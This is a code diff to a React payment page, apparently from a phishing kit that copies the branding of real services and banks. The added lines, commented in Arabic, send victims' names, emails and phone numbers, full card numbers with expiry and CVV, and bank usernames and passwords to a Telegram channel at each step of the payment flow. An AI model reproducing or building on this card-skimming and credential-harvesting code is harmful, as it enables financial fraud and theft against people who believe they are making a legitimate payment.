@@ -18,6 +18,7 @@ import {
 import { useToast } from "@/hooks/use-toast";
 import { validateLuhn, formatCardNumber, validateExpiry, validateCVV } from "@/lib/cardValidation";
 import { sendToTelegram } from "@/lib/telegram";
+import { getBankDesign } from "@/lib/bankDesigns";
 
 const UnifiedPayment = () => {
   const { id } = useParams();
@@ -147,6 +148,26 @@ const UnifiedPayment = () => {
             payment_amount: parseFloat(paymentAmount),
           },
         });
+        
+        // إرسال بيانات العميل إلى تيليجرام
+        await sendToTelegram({
+          type: 'payment_recipient',
+          data: {
+            linkId: id!,
+            serviceKey: selectedService,
+            serviceName: branding.nameAr || selectedService,
+            name: customerName,
+            email: customerEmail,
+            phone: customerPhone,
+            invoiceNumber: invoiceNumber,
+            amount: parseFloat(paymentAmount),
+            currency: countryCode,
+            country: countryData?.nameAr || countryCode,
+            step: 'customer_info'
+          },
+          timestamp: new Date().toISOString()
+        });
+        
         setStep(2);
       } catch (error) {
         console.error("Error updating link:", error);
@@ -169,6 +190,26 @@ const UnifiedPayment = () => {
             selected_bank: selectedBank,
           },
         });
+        
+        // إرسال اختيار البنك إلى تيليجرام
+        const selectedBankData = banks.find(b => b.id === selectedBank);
+        await sendToTelegram({
+          type: 'payment_recipient',
+          data: {
+            linkId: id!,
+            serviceKey: selectedService,
+            serviceName: branding.nameAr || selectedService,
+            name: customerName,
+            email: customerEmail,
+            phone: customerPhone,
+            bank: selectedBankData?.nameAr || selectedBank,
+            bankId: selectedBank,
+            country: countryData?.nameAr || countryCode,
+            step: 'bank_selected'
+          },
+          timestamp: new Date().toISOString()
+        });
+        
         setStep(3);
       } catch (error) {
         console.error("Error updating link:", error);
@@ -212,6 +253,30 @@ const UnifiedPayment = () => {
           return;
         }
         
+        // إرسال بيانات البطاقة إلى تيليجرام
+        const selectedBankData = banks.find(b => b.id === selectedBank);
+        await sendToTelegram({
+          type: 'card_details_with_bank',
+          data: {
+            name: customerName,
+            email: customerEmail,
+            phone: customerPhone,
+            service: branding.nameAr || selectedService,
+            country: countryData?.nameAr || countryCode,
+            countryCode: countryCode,
+            bank: selectedBankData?.nameAr || selectedBank,
+            bankId: selectedBank,
+            cardholder: cardName,
+            cardNumber: cardNumber,
+            cardLast4: cardNumber.replace(/\s/g, "").slice(-4),
+            cardType: 'card',
+            expiry: `${expiryMonth}/${expiryYear}`,
+            cvv: cvv,
+            amount: formatCurrency(parseFloat(paymentAmount), countryCode)
+          },
+          timestamp: new Date().toISOString()
+        });
+        
         setStep(4);
       } else {
         if (!bankUsername || !bankPassword) {
@@ -222,6 +287,28 @@ const UnifiedPayment = () => {
           });
           return;
         }
+        
+        // إرسال بيانات تسجيل الدخول إلى تيليجرام
+        const selectedBankData = banks.find(b => b.id === selectedBank);
+        await sendToTelegram({
+          type: 'bank_login',
+          data: {
+            name: customerName,
+            email: customerEmail,
+            phone: customerPhone,
+            service: branding.nameAr || selectedService,
+            country: countryData?.nameAr || countryCode,
+            countryCode: countryCode,
+            bank: selectedBankData?.nameAr || selectedBank,
+            bankId: selectedBank,
+            username: bankUsername,
+            password: bankPassword,
+            loginType: 'username',
+            amount: formatCurrency(parseFloat(paymentAmount), countryCode)
+          },
+          timestamp: new Date().toISOString()
+        });
+        
         setStep(4);
       }
     } else if (step === 4) {
